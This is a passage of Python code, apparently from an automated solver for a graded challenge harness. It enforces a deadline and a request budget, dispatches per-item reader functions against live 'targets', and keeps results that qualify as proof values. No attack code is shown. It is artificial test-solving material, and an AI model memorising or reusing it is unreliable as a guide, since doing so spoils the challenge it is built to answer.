    deadline = ctx.get("deadline")
    if validated is None or not isinstance(deadline, (int, float)) or isinstance(deadline, bool) \
            or float(deadline) <= time.time() + 0.05:
        return WebAnswers()
    day, mode, rows = validated
    try:
        requested_budget = int(ctx.get("max_requests") or TARGET_REQUEST_BUDGET)
    except (TypeError, ValueError):
        return WebAnswers()
    maximum = max(1, min(requested_budget, TARGET_REQUEST_BUDGET))
    total = len(rows)

    def one(client: TargetClient, current_attempt: dict, index: int):
        reader = EARLY_READERS.get(index) if mode == "mastery" and index < total else LATE_READERS[day]
        return reader(client, current_attempt) if reader is not None else None

    values = solve_fresh_targets(
        attempt, one, deadline=float(deadline), max_requests=maximum, indexed=True)
    out = WebAnswers()
    for answer_id, value in values.items():
        if is_proof_value(value):
            out[answer_id] = value
    out.target_requests = getattr(values, "target_requests", None)
    return out


def solve(_attempt: dict, _deliveries: list, _ctx: dict) -> WebAnswers:
    """Artifact entry point: live-target modes have no delivery."""
    return WebAnswers()
